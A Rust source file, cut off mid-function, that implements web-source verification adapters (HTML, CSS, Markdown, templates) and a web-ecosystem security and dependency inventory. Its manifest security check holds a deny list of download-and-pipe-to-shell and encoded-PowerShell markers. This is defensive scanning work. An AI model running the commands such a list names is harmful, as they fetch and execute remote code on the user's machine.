use std::collections::BTreeSet;
use std::fs;
use std::path::{Path, PathBuf};

use verificationforge_core::{
    CheckKind, CheckResult, CheckStatus, ExecutionAdapter, Finding, ImpactScope, LanguageAdapter,
    LanguageDetection, SpecialistDomain, SpecialistVerificationAdapter, SymbolId,
    run_repository_harness,
};

const MAX_SCAN_BYTES: u64 = 2 * 1024 * 1024;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum SourceKind {
    Html,
    Css,
    Markdown,
    Template,
}

#[derive(Clone, Copy)]
struct SourceProfile {
    id: &'static str,
    language: &'static str,
    extensions: &'static [&'static str],
    kind: SourceKind,
}

const HTML: SourceProfile = SourceProfile {
    id: "html",
    language: "HTML",
    extensions: &["html", "htm"],
    kind: SourceKind::Html,
};

const CSS: SourceProfile = SourceProfile {
    id: "css",
    language: "CSS",
    extensions: &["css", "scss", "sass", "less", "styl"],
    kind: SourceKind::Css,
};

const MARKDOWN: SourceProfile = SourceProfile {
    id: "markdown",
    language: "Markdown",
    extensions: &["md", "markdown"],
    kind: SourceKind::Markdown,
};

const WEB_TEMPLATE: SourceProfile = SourceProfile {
    id: "web-template",
    language: "Web Template/SFC",
    extensions: &[
        "vue",
        "svelte",
        "astro",
        "mdx",
        "ejs",
        "hbs",
        "handlebars",
        "pug",
        "njk",
        "nunjucks",
        "liquid",
        "mustache",
    ],
    kind: SourceKind::Template,
};

pub struct HtmlAdapter;
pub struct CssAdapter;
pub struct MarkdownAdapter;
pub struct WebTemplateAdapter;
pub struct WebEcosystemSpecialist;

macro_rules! impl_source_adapter {
    ($adapter:ty, $profile:expr) => {
        impl LanguageAdapter for $adapter {
            fn id(&self) -> &'static str {
                $profile.id
            }

            fn detect(&self, repo: &Path) -> Option<LanguageDetection> {
                detect_source($profile, repo)
            }

            fn inventory_symbols(&self, repo: &Path) -> Result<Vec<SymbolId>, String> {
                inventory_symbols($profile, repo)
            }

            fn run_parse_check(
                &self,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
            ) -> CheckResult {
                run_parse($profile, repo, execution)
            }

            fn run_format_check(
                &self,
                repo: &Path,
                _execution: &dyn ExecutionAdapter,
            ) -> CheckResult {
                run_format($profile, repo)
            }

            fn run_targeted_tests(
                &self,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
                scope: &ImpactScope,
            ) -> CheckResult {
                run_targeted_tests($profile, repo, execution, scope)
            }

            fn run_integration_tests(
                &self,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
                _scope: &ImpactScope,
            ) -> CheckResult {
                run_named_test_script(
                    $profile,
                    repo,
                    execution,
                    "checkpoint-integration",
                    &["test:integration", "integration"],
                )
            }

            fn run_property_tests(
                &self,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
                _scope: &ImpactScope,
            ) -> CheckResult {
                run_named_test_script(
                    $profile,
                    repo,
                    execution,
                    "checkpoint-property",
                    &["test:property", "property"],
                )
            }

            fn run_ui_verification(
                &self,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
                _scope: &ImpactScope,
            ) -> CheckResult {
                run_ui_surface($profile, repo, execution, "checkpoint-ui")
            }

            fn run_api_verification(
                &self,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
                _scope: &ImpactScope,
            ) -> CheckResult {
                run_contract_surface($profile, repo, execution, "checkpoint-api")
            }

            fn run_check(
                &self,
                check: CheckKind,
                repo: &Path,
                execution: &dyn ExecutionAdapter,
            ) -> CheckResult {
                run_source_check($profile, check, repo, execution)
            }
        }
    };
}

impl_source_adapter!(HtmlAdapter, HTML);
impl_source_adapter!(CssAdapter, CSS);
impl_source_adapter!(MarkdownAdapter, MARKDOWN);
impl_source_adapter!(WebTemplateAdapter, WEB_TEMPLATE);

impl SpecialistVerificationAdapter for WebEcosystemSpecialist {
    fn id(&self) -> &'static str {
        "web-ecosystem"
    }

    fn domains(&self) -> &'static [SpecialistDomain] {
        &[
            SpecialistDomain::StaticAnalysis,
            SpecialistDomain::Security,
            SpecialistDomain::Dependencies,
            SpecialistDomain::SupplyChain,
            SpecialistDomain::Ui,
            SpecialistDomain::Api,
            SpecialistDomain::Contracts,
        ]
    }

    fn supports(&self, check: CheckKind) -> bool {
        matches!(
            check,
            CheckKind::Security | CheckKind::Dependencies | CheckKind::Ui | CheckKind::Contracts
        )
    }

    fn run_check(
        &self,
        check: CheckKind,
        repo: &Path,
        execution: &dyn ExecutionAdapter,
    ) -> CheckResult {
        let inventory = WebInventory::detect(repo);
        if inventory.is_empty() {
            return CheckResult::skipped(
                format!("web-ecosystem:{}", check.as_str()),
                "no web runtime/framework/build/test/platform ecosystem markers detected",
            );
        }
        match check {
            CheckKind::Security => web_manifest_security(repo, &inventory),
            CheckKind::Dependencies => web_dependency_inventory(repo, execution, &inventory),
            CheckKind::Ui => {
                if inventory.has_ui_surface() {
                    required_web_harness(repo, execution, "ui", &inventory)
                } else {
                    CheckResult::skipped(
                        "web-ecosystem:ui",
                        format!("no UI framework surface detected; {}", inventory.summary()),
                    )
                }
            }
            CheckKind::Contracts => {
                if inventory.has_api_surface() {
                    required_web_harness(repo, execution, "contracts", &inventory)
                } else {
                    CheckResult::skipped(
                        "web-ecosystem:contracts",
                        format!(
                            "no web API/server contract surface detected; {}",
                            inventory.summary()
                        ),
                    )
                }
            }
            _ => CheckResult::unsupported(
                format!("web-ecosystem:{}", check.as_str()),
                "web ecosystem specialist does not handle this check",
            ),
        }
    }
}

fn detect_source(profile: SourceProfile, repo: &Path) -> Option<LanguageDetection> {
    let files = source_files(profile, repo);
    if files.is_empty() {
        return None;
    }
    let confidence = match profile.kind {
        SourceKind::Html => 97,
        SourceKind::Css => 96,
        SourceKind::Markdown => 95,
        SourceKind::Template => 98,
    };
    Some(LanguageDetection {
        adapter_id: profile.id.into(),
        language: profile.language.into(),
        confidence_percent: confidence,
    })
}

fn inventory_symbols(profile: SourceProfile, repo: &Path) -> Result<Vec<SymbolId>, String> {
    let mut symbols = Vec::new();
    for path in source_files(profile, repo) {
        let relative = display_relative(repo, &path);
        symbols.push(SymbolId(format!("{}:file:{relative}", profile.id)));
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        match profile.kind {
            SourceKind::Html | SourceKind::Template => {
                for (index, line) in content.lines().enumerate() {
                    for marker in ["id=\"", "id='", "name=\"", "name='"] {
                        for value in quoted_values(line, marker) {
                            symbols.push(SymbolId(format!(
                                "{}:element:{relative}:{}:{value}",
                                profile.id,
                                index + 1
                            )));
                        }
                    }
                }
            }
            SourceKind::Css => {
                for (index, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.ends_with('{') {
                        let selector = trimmed.trim_end_matches('{').trim();
                        if !selector.is_empty() {
                            symbols.push(SymbolId(format!(
                                "css:selector:{relative}:{}:{selector}",
                                index + 1
                            )));
                        }
                    }
                    if let Some(start) = trimmed.find("--") {
                        let rest = &trimmed[start..];
                        if let Some(end) = rest.find(':') {
                            symbols.push(SymbolId(format!(
                                "css:custom-property:{relative}:{}:{}",
                                index + 1,
                                &rest[..end]
                            )));
                        }
                    }
                }
            }
            SourceKind::Markdown => {
                for (index, line) in content.lines().enumerate() {
                    let trimmed = line.trim_start();
                    let hashes = trimmed.chars().take_while(|ch| *ch == '#').count();
                    if (1..=6).contains(&hashes)
                        && trimmed.chars().nth(hashes).is_some_and(char::is_whitespace)
                    {
                        symbols.push(SymbolId(format!(
                            "markdown:heading:{relative}:{}:{}",
                            index + 1,
                            trimmed[hashes..].trim()
                        )));
                    }
                }
            }
        }
    }
    symbols.sort();
    symbols.dedup();
    Ok(symbols)
}

fn run_parse(profile: SourceProfile, repo: &Path, execution: &dyn ExecutionAdapter) -> CheckResult {
    if profile.kind == SourceKind::Template {
        for script in ["check", "typecheck"] {
            if package_has_script(repo, script) {
                return run_package_script(profile, repo, execution, "parse", script);
            }
        }
    }
    match profile.kind {
        SourceKind::Html => validate_html(profile, repo),
        SourceKind::Css => validate_css(profile, repo),
        SourceKind::Markdown => validate_markdown(profile, repo),
        SourceKind::Template => validate_templates(profile, repo),
    }
}

fn run_source_check(
    profile: SourceProfile,
    check: CheckKind,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
) -> CheckResult {
    match check {
        CheckKind::Build => {
            if profile.kind == SourceKind::Template && package_has_script(repo, "build") {
                run_package_script(profile, repo, execution, "build", "build")
            } else {
                rename_check(
                    run_parse(profile, repo, execution),
                    format!("{}:build", profile.id),
                )
            }
        }
        CheckKind::TypeCheck => {
            if profile.kind == SourceKind::Template {
                for script in ["typecheck", "check"] {
                    if package_has_script(repo, script) {
                        return run_package_script(profile, repo, execution, "type-check", script);
                    }
                }
            }
            rename_check(
                run_parse(profile, repo, execution),
                format!("{}:type-check", profile.id),
            )
        }
        CheckKind::Lint => run_lint(profile, repo, execution),
        CheckKind::Test => run_tests(profile, repo, execution),
        CheckKind::Dependencies => source_dependency_inventory(profile, repo),
        CheckKind::Security => source_security_scan(profile, repo),
        CheckKind::Placeholders => placeholder_scan(profile, repo),
        CheckKind::Concurrency => CheckResult::skipped(
            format!("{}:concurrency", profile.id),
            format!(
                "{} source has no native shared-memory concurrency model",
                profile.language
            ),
        ),
        CheckKind::Ui => run_ui_surface(profile, repo, execution, "ui"),
        CheckKind::Contracts => run_contract_surface(profile, repo, execution, "contracts"),
        CheckKind::Coverage
        | CheckKind::Mutation
        | CheckKind::Fuzz
        | CheckKind::Stress
        | CheckKind::FaultInjection
        | CheckKind::FormalProof => {
            required_source_harness(profile, repo, execution, check.as_str())
        }
    }
}

fn run_lint(profile: SourceProfile, repo: &Path, execution: &dyn ExecutionAdapter) -> CheckResult {
    if profile.kind == SourceKind::Template && package_has_script(repo, "lint") {
        return run_package_script(profile, repo, execution, "lint", "lint");
    }
    let parsed = run_parse(profile, repo, execution);
    if parsed.status != CheckStatus::Pass {
        return rename_check(parsed, format!("{}:lint", profile.id));
    }
    let formatted = run_format(profile, repo);
    if formatted.status != CheckStatus::Pass {
        return rename_check(formatted, format!("{}:lint", profile.id));
    }
    CheckResult::pass_with_evidence(
        format!("{}:lint", profile.id),
        format!(
            "built-in {} structural and deterministic style policy passed files={}",
            profile.language,
            source_files(profile, repo).len()
        ),
    )
}

fn run_format(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut findings = Vec::new();
    let mut scanned = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        scanned += 1;
        for (index, line) in content.lines().enumerate() {
            if line.ends_with(' ') || line.ends_with('\t') {
                findings.push(Finding {
                    code: "VF_WEB_FORMAT_TRAILING_WHITESPACE".into(),
                    message: format!(
                        "{}:{} has trailing whitespace",
                        display_relative(repo, &path),
                        index + 1
                    ),
                    blocking: true,
                });
            }
        }
        if !content.is_empty() && !content.ends_with('\n') {
            findings.push(Finding {
                code: "VF_WEB_FORMAT_FINAL_NEWLINE".into(),
                message: format!(
                    "{} is missing a final newline",
                    display_relative(repo, &path)
                ),
                blocking: true,
            });
        }
    }
    if findings.is_empty() {
        CheckResult::pass_with_evidence(
            format!("{}:format", profile.id),
            format!("deterministic web-source formatting files={scanned} violations=0"),
        )
    } else {
        CheckResult {
            check: format!("{}:format", profile.id),
            status: CheckStatus::Fail,
            findings,
        }
    }
}

fn run_targeted_tests(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    scope: &ImpactScope,
) -> CheckResult {
    let affected = scope.changed_paths.iter().any(|path| {
        let extension = Path::new(path)
            .extension()
            .and_then(|value| value.to_str())
            .unwrap_or_default()
            .to_ascii_lowercase();
        profile.extensions.contains(&extension.as_str())
            || matches!(
                Path::new(path).file_name().and_then(|value| value.to_str()),
                Some(
                    "package.json"
                        | "package-lock.json"
                        | "pnpm-lock.yaml"
                        | "yarn.lock"
                        | "bun.lock"
                        | "deno.json"
                )
            )
    });
    if !affected && !scope.requires_full_verification {
        return CheckResult::skipped(
            format!("{}:targeted-test", profile.id),
            "no changed web-family path maps to this adapter",
        );
    }
    rename_check(
        run_tests(profile, repo, execution),
        format!("{}:targeted-test", profile.id),
    )
}

fn run_tests(profile: SourceProfile, repo: &Path, execution: &dyn ExecutionAdapter) -> CheckResult {
    if package_has_script(repo, "test") {
        run_package_script(profile, repo, execution, "test", "test")
    } else {
        CheckResult::skipped(
            format!("{}:test", profile.id),
            format!(
                "{} repository declares no native test script",
                profile.language
            ),
        )
    }
}

fn run_named_test_script(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
    scripts: &[&str],
) -> CheckResult {
    for script in scripts {
        if package_has_script(repo, script) {
            return run_package_script(profile, repo, execution, check_name, script);
        }
    }
    CheckResult::skipped(
        format!("{}:{check_name}", profile.id),
        format!(
            "no {check_name} package script detected for {}",
            profile.language
        ),
    )
}

fn run_ui_surface(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
) -> CheckResult {
    if !matches!(profile.kind, SourceKind::Html | SourceKind::Template) {
        return CheckResult::skipped(
            format!("{}:{check_name}", profile.id),
            format!(
                "{} does not directly define interactive controls",
                profile.language
            ),
        );
    }
    let controls = interactive_control_count(profile, repo);
    if controls == 0 {
        return CheckResult::skipped(
            format!("{}:{check_name}", profile.id),
            "no interactive controls detected in affected web source",
        );
    }
    required_source_harness(profile, repo, execution, check_name)
}

fn run_contract_surface(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
) -> CheckResult {
    if !repository_contains_source(
        profile,
        repo,
        &["<form", "fetch(", "axios.", "action=", "method="],
    ) {
        return CheckResult::skipped(
            format!("{}:{check_name}", profile.id),
            "no web contract/API surface detected in this source family",
        );
    }
    required_source_harness(profile, repo, execution, check_name)
}

fn required_source_harness(
    profile: SourceProfile,
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
) -> CheckResult {
    let harness = format!("{}-{check_name}", profile.id);
    run_repository_harness(
        repo,
        execution,
        format!("{}:{check_name}", profile.id),
        &harness,
    )
    .unwrap_or_else(|| {
        CheckResult::unsupported(
            format!("{}:{check_name}", profile.id),
            format!(
                "required {} harness is missing: .verificationforge/{harness}.argv",
                profile.language
            ),
        )
    })
}

fn validate_html(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut checked = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        checked += 1;
        if let Some(error) = html_syntax_error(&content) {
            return CheckResult::fail(
                "html:parse",
                "VF_HTML_PARSE_FAILED",
                format!("{}: {error}", display_relative(repo, &path)),
            );
        }
    }
    CheckResult::pass_with_evidence(
        "html:parse",
        format!("built-in HTML structural parser accepted files={checked}"),
    )
}

fn html_syntax_error(content: &str) -> Option<String> {
    let mut index = 0usize;
    let bytes = content.as_bytes();
    while index < bytes.len() {
        if content[index..].starts_with("<!--") {
            let rest = &content[index + 4..];
            let Some(end) = rest.find("-->") else {
                return Some("unclosed HTML comment".into());
            };
            index += 4 + end + 3;
            continue;
        }
        if bytes[index] == b'<' {
            let mut quote = None;
            let mut cursor = index + 1;
            let mut found_end = false;
            while cursor < bytes.len() {
                let ch = bytes[cursor] as char;
                match quote {
                    Some(active) if ch == active => quote = None,
                    Some(_) => {}
                    None if ch == '\'' || ch == '"' => quote = Some(ch),
                    None if ch == '>' => {
                        found_end = true;
                        break;
                    }
                    None => {}
                }
                cursor += 1;
            }
            if quote.is_some() {
                return Some("unclosed quote inside HTML tag".into());
            }
            if !found_end {
                return Some("unclosed HTML tag delimiter".into());
            }
            index = cursor + 1;
            continue;
        }
        index += 1;
    }
    None
}

fn validate_css(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut checked = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        checked += 1;
        if let Some(error) = balanced_web_delimiters(&content, true) {
            return CheckResult::fail(
                "css:parse",
                "VF_CSS_PARSE_FAILED",
                format!("{}: {error}", display_relative(repo, &path)),
            );
        }
    }
    CheckResult::pass_with_evidence(
        "css:parse",
        format!("built-in stylesheet structural parser accepted files={checked}"),
    )
}

fn validate_markdown(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut checked = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        checked += 1;
        let mut fence: Option<&str> = None;
        for line in content.lines() {
            let trimmed = line.trim_start();
            let marker = if trimmed.starts_with("```") {
                Some("```")
            } else if trimmed.starts_with("~~~") {
                Some("~~~")
            } else {
                None
            };
            if let Some(marker) = marker {
                match fence {
                    None => fence = Some(marker),
                    Some(active) if active == marker => fence = None,
                    Some(_) => {}
                }
            }
        }
        if fence.is_some() {
            return CheckResult::fail(
                "markdown:parse",
                "VF_MARKDOWN_FENCE_UNCLOSED",
                format!(
                    "{} has an unclosed fenced code block",
                    display_relative(repo, &path)
                ),
            );
        }
    }
    CheckResult::pass_with_evidence(
        "markdown:parse",
        format!("built-in Markdown structural parser accepted files={checked}"),
    )
}

fn validate_templates(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut checked = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        checked += 1;
        if let Some(error) = balanced_web_delimiters(&content, false) {
            return CheckResult::fail(
                "web-template:parse",
                "VF_WEB_TEMPLATE_PARSE_FAILED",
                format!("{}: {error}", display_relative(repo, &path)),
            );
        }
        if content.matches("{{").count() != content.matches("}}").count() {
            return CheckResult::fail(
                "web-template:parse",
                "VF_WEB_TEMPLATE_BRACES_UNBALANCED",
                format!(
                    "{} has unbalanced template braces",
                    display_relative(repo, &path)
                ),
            );
        }
    }
    CheckResult::pass_with_evidence(
        "web-template:parse",
        format!("built-in web template/SFC structural parser accepted files={checked}"),
    )
}

fn balanced_web_delimiters(content: &str, css_comments: bool) -> Option<String> {
    let mut braces = 0i32;
    let mut brackets = 0i32;
    let mut parens = 0i32;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    let mut comment = false;
    let chars: Vec<char> = content.chars().collect();
    let mut index = 0usize;
    while index < chars.len() {
        let ch = chars[index];
        let next = chars.get(index + 1).copied();
        if comment {
            if ch == '*' && next == Some('/') {
                comment = false;
                index += 2;
                continue;
            }
            index += 1;
            continue;
        }
        if quote.is_none() && css_comments && ch == '/' && next == Some('*') {
            comment = true;
            index += 2;
            continue;
        }
        if let Some(active) = quote {
            if escaped {
                escaped = false;
            } else if ch == '\\' {
                escaped = true;
            } else if ch == active {
                quote = None;
            }
            index += 1;
            continue;
        }
        if ch == '\'' || ch == '"' || ch == '`' {
            quote = Some(ch);
            index += 1;
            continue;
        }
        match ch {
            '{' => braces += 1,
            '}' => braces -= 1,
            '[' => brackets += 1,
            ']' => brackets -= 1,
            '(' => parens += 1,
            ')' => parens -= 1,
            _ => {}
        }
        if braces < 0 || brackets < 0 || parens < 0 {
            return Some("closing delimiter appears before matching opener".into());
        }
        index += 1;
    }
    if comment {
        return Some("unclosed block comment".into());
    }
    if quote.is_some() {
        return Some("unclosed string/template quote".into());
    }
    if braces != 0 || brackets != 0 || parens != 0 {
        return Some(format!(
            "unbalanced delimiters braces={braces} brackets={brackets} parens={parens}"
        ));
    }
    None
}

fn placeholder_scan(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut findings = Vec::new();
    let mut scanned = 0usize;
    for path in source_files(profile, repo) {
        let Ok(metadata) = fs::metadata(&path) else {
            continue;
        };
        if metadata.len() > MAX_SCAN_BYTES {
            continue;
        }
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        scanned += 1;
        for (index, line) in content.lines().enumerate() {
            let lower = line.to_ascii_lowercase();
            if lower.contains(&["to", "do:"].concat())
                || lower.contains(&["fix", "me:"].concat())
                || lower.contains(&["x", "xx:"].concat())
                || lower.contains("not implemented")
            {
                findings.push(Finding {
                    code: "VF_WEB_PLACEHOLDER".into(),
                    message: format!(
                        "{}:{} contains an unfinished web implementation marker",
                        display_relative(repo, &path),
                        index + 1
                    ),
                    blocking: true,
                });
            }
        }
    }
    if findings.is_empty() {
        CheckResult::pass_with_evidence(
            format!("{}:placeholders", profile.id),
            format!(
                "scanned {scanned} {} source files for unfinished markers",
                profile.language
            ),
        )
    } else {
        CheckResult {
            check: format!("{}:placeholders", profile.id),
            status: CheckStatus::Fail,
            findings,
        }
    }
}

fn source_security_scan(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut findings = Vec::new();
    let mut scanned = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        scanned += 1;
        for (index, line) in content.lines().enumerate() {
            let lower = line.to_ascii_lowercase();
            if lower.contains("javascript:") {
                findings.push(Finding {
                    code: "VF_WEB_JAVASCRIPT_URL".into(),
                    message: format!(
                        "{}:{} contains a javascript: URL",
                        display_relative(repo, &path),
                        index + 1
                    ),
                    blocking: true,
                });
            }
            if lower.contains("http://")
                && (lower.contains("<script")
                    || lower.contains("@import")
                    || lower.contains("<link"))
            {
                findings.push(Finding {
                    code: "VF_WEB_INSECURE_REMOTE_RESOURCE".into(),
                    message: format!(
                        "{}:{} loads an executable/style resource over plain HTTP",
                        display_relative(repo, &path),
                        index + 1
                    ),
                    blocking: true,
                });
            }
        }
    }
    if findings.is_empty() {
        CheckResult::pass_with_evidence(
            format!("{}:security", profile.id),
            format!("web source security scan files={scanned} high-confidence hazards=0"),
        )
    } else {
        CheckResult {
            check: format!("{}:security", profile.id),
            status: CheckStatus::Fail,
            findings,
        }
    }
}

fn source_dependency_inventory(profile: SourceProfile, repo: &Path) -> CheckResult {
    let mut references = 0usize;
    for path in source_files(profile, repo) {
        let Ok(content) = fs::read_to_string(&path) else {
            continue;
        };
        references += content.matches(" src=").count();
        references += content.matches(" href=").count();
        references += content.matches("@import").count();
        references += content.matches("](").count();
    }
    CheckResult::pass_with_evidence(
        format!("{}:dependencies", profile.id),
        format!(
            "inventoried {} source dependency/reference edges={references}",
            profile.language
        ),
    )
}

#[derive(Debug, Default)]
struct WebInventory {
    runtimes: BTreeSet<&'static str>,
    package_managers: BTreeSet<&'static str>,
    ui_frameworks: BTreeSet<&'static str>,
    meta_frameworks: BTreeSet<&'static str>,
    server_frameworks: BTreeSet<&'static str>,
    build_tools: BTreeSet<&'static str>,
    test_tools: BTreeSet<&'static str>,
    styling_tools: BTreeSet<&'static str>,
    platforms: BTreeSet<&'static str>,
}

impl WebInventory {
    fn detect(repo: &Path) -> Self {
        let mut inventory = Self::default();
        let package = fs::read_to_string(repo.join("package.json")).unwrap_or_default();
        let lower = package.to_ascii_lowercase();

        if !package.is_empty() {
            inventory.runtimes.insert("Node.js");
        }
        if repo.join("deno.json").is_file()
            || repo.join("deno.jsonc").is_file()
            || repo.join("deno.lock").is_file()
        {
            inventory.runtimes.insert("Deno");
        }
        if repo.join("bun.lock").is_file()
            || repo.join("bun.lockb").is_file()
            || repo.join("bunfig.toml").is_file()
            || lower.contains("\"packageManager\": \"bun")
            || lower.contains("\"packagemanager\":\"bun")
        {
            inventory.runtimes.insert("Bun");
        }

        if repo.join("package-lock.json").is_file()
            || (!package.is_empty() && inventory.package_managers.is_empty())
        {
            inventory.package_managers.insert("npm");
        }
        if repo.join("pnpm-lock.yaml").is_file() {
            inventory.package_managers.insert("pnpm");
        }
        if repo.join("yarn.lock").is_file() {
            inventory.package_managers.insert("Yarn");
        }
        if repo.join("bun.lock").is_file() || repo.join("bun.lockb").is_file() {
            inventory.package_managers.insert("Bun package manager");
        }

        detect_packages(
            &lower,
            &mut inventory.ui_frameworks,
            &[
                ("react", "React"),
                ("preact", "Preact"),
                ("vue", "Vue"),
                ("@angular/core", "Angular"),
                ("svelte", "Svelte"),
                ("solid-js", "SolidJS"),
                ("@builder.io/qwik", "Qwik"),
                ("lit", "Lit"),
                ("alpinejs", "Alpine.js"),
                ("htmx.org", "HTMX"),
            ],
        );
        detect_packages(
            &lower,
            &mut inventory.meta_frameworks,
            &[
                ("next", "Next.js"),
                ("nuxt", "Nuxt"),
                ("@sveltejs/kit", "SvelteKit"),
                ("astro", "Astro"),
                ("@remix-run/", "Remix"),
                ("react-router", "React Router"),
                ("gatsby", "Gatsby"),
                ("@11ty/eleventy", "Eleventy"),
                ("@docusaurus/core", "Docusaurus"),
                ("vitepress", "VitePress"),
            ],
        );
        detect_packages(
            &lower,
            &mut inventory.server_frameworks,
            &[
                ("express", "Express"),
                ("fastify", "Fastify"),
                ("@nestjs/core", "NestJS"),
                ("koa", "Koa"),
                ("hono", "Hono"),
                ("h3", "h3"),
                ("socket.io", "Socket.IO"),
                ("ws", "ws"),
            ],
        );
        detect_packages(
            &lower,
            &mut inventory.build_tools,
            &[
                ("vite", "Vite"),
                ("webpack", "webpack"),
                ("rollup", "Rollup"),
                ("esbuild", "esbuild"),
                ("parcel", "Parcel"),
                ("@rspack/core", "Rspack"),
                ("turbo", "Turborepo"),
                ("nx", "Nx"),
            ],
        );
        detect_packages(
            &lower,
            &mut inventory.test_tools,
            &[
                ("vitest", "Vitest"),
                ("jest", "Jest"),
                ("@playwright/test", "Playwright"),
                ("cypress", "Cypress"),
                ("mocha", "Mocha"),
                ("ava", "AVA"),
            ],
        );
        if lower.contains("node --test") || lower.contains("node --test-") {
            inventory.test_tools.insert("Node test runner");
        }
        detect_packages(
            &lower,
            &mut inventory.styling_tools,
            &[
                ("tailwindcss", "Tailwind CSS"),
                ("postcss", "PostCSS"),
                ("sass", "Sass"),
                ("less", "Less"),
                ("styled-components", "styled-components"),
                ("@emotion/", "Emotion"),
            ],
        );

        if repo.join("vercel.json").is_file() {
            inventory.platforms.insert("Vercel");
        }
        if repo.join("netlify.toml").is_file() {
            inventory.platforms.insert("Netlify");
        }
        if repo.join("wrangler.toml").is_file()
            || repo.join("wrangler.json").is_file()
            || repo.join("wrangler.jsonc").is_file()
            || package_has_marker(&lower, "wrangler")
        {
            inventory.platforms.insert("Cloudflare Workers/Pages");
        }
        if repo.join("firebase.json").is_file() || package_has_marker(&lower, "firebase") {
            inventory.platforms.insert("Firebase");
        }

        inventory
    }

    fn is_empty(&self) -> bool {
        self.runtimes.is_empty()
            && self.package_managers.is_empty()
            && self.ui_frameworks.is_empty()
            && self.meta_frameworks.is_empty()
            && self.server_frameworks.is_empty()
            && self.build_tools.is_empty()
            && self.test_tools.is_empty()
            && self.styling_tools.is_empty()
            && self.platforms.is_empty()
    }

    fn has_ui_surface(&self) -> bool {
        !self.ui_frameworks.is_empty() || !self.meta_frameworks.is_empty()
    }

    fn has_api_surface(&self) -> bool {
        !self.server_frameworks.is_empty()
            || self
                .meta_frameworks
                .iter()
                .any(|name| matches!(*name, "Next.js" | "Nuxt" | "SvelteKit" | "Astro" | "Remix"))
    }

    fn summary(&self) -> String {
        format!(
            "runtimes=[{}] package_managers=[{}] ui=[{}] meta=[{}] server=[{}] build=[{}] test=[{}] styling=[{}] platforms=[{}]",
            join_set(&self.runtimes),
            join_set(&self.package_managers),
            join_set(&self.ui_frameworks),
            join_set(&self.meta_frameworks),
            join_set(&self.server_frameworks),
            join_set(&self.build_tools),
            join_set(&self.test_tools),
            join_set(&self.styling_tools),
            join_set(&self.platforms),
        )
    }
}

fn web_manifest_security(repo: &Path, inventory: &WebInventory) -> CheckResult {
    let package = fs::read_to_string(repo.join("package.json")).unwrap_or_default();
    let lower = package.to_ascii_lowercase();
    let risky = [
        "curl ",
        "wget ",
        "| sh",
        "| bash",
        "powershell -enc",
        "powershell -encodedcommand",
    ];
    if let Some(marker) = risky.iter().find(|marker| lower.contains(**marker)) {
        return CheckResult::fail(
            "web-ecosystem:security",
            "VF_WEB_RISKY_LIFECYCLE_SCRIPT",
            format!("package manifest contains high-risk lifecycle/script marker: {marker}"),
        );
    }
    CheckResult::pass_with_evidence(
        "web-ecosystem:security",
        format!(
            "web manifest/ecosystem security scan found no high-confidence remote-shell lifecycle markers; {}",
            inventory.summary()
        ),
    )
}

fn web_dependency_inventory(
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    inventory: &WebInventory,
) -> CheckResult {
    if repo.join("node_modules").is_dir()
        && let Some(manager) = package_manager(execution, repo)
    {
        let args = match manager {
            "npm" => vec!["ls".into(), "--all".into(), "--omit=optional".into()],
            "pnpm" => vec!["list".into(), "--depth".into(), "Infinity".into()],
            "yarn" => vec!["list".into(), "--json".into()],
            "bun" => vec!["pm".into(), "ls".into()],
            _ => Vec::new(),
        };
        return run_specialist_command(repo, execution, "dependencies", manager, args, inventory);
    }
    let manifest_count = [
        "package.json",
        "package-lock.json",
        "pnpm-lock.yaml",
        "yarn.lock",
        "bun.lock",
        "bun.lockb",
        "deno.json",
        "deno.jsonc",
    ]
    .iter()
    .filter(|name| repo.join(name).is_file())
    .count();
    CheckResult::pass_with_evidence(
        "web-ecosystem:dependencies",
        format!(
            "inventoried web dependency manifests/lockfiles={manifest_count}; {}",
            inventory.summary()
        ),
    )
}

fn required_web_harness(
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
    inventory: &WebInventory,
) -> CheckResult {
    let harness = format!("web-ecosystem-{check_name}");
    run_repository_harness(
        repo,
        execution,
        format!("web-ecosystem:{check_name}"),
        &harness,
    )
    .unwrap_or_else(|| {
        CheckResult::unsupported(
            format!("web-ecosystem:{check_name}"),
            format!(
                "required web ecosystem harness is missing: .verificationforge/{harness}.argv; {}",
                inventory.summary()
            ),
        )
    })
}

fn run_specialist_command(
    repo: &Path,
    execution: &dyn ExecutionAdapter,
    check_name: &str,
    program: &str,
    args: Vec<String>,
    inventory: &WebInventory,
) -> CheckResult {
    match execution.execute(program, &args, repo) {
        Ok(output) if output.success() => CheckResult::pass_with_evidence(
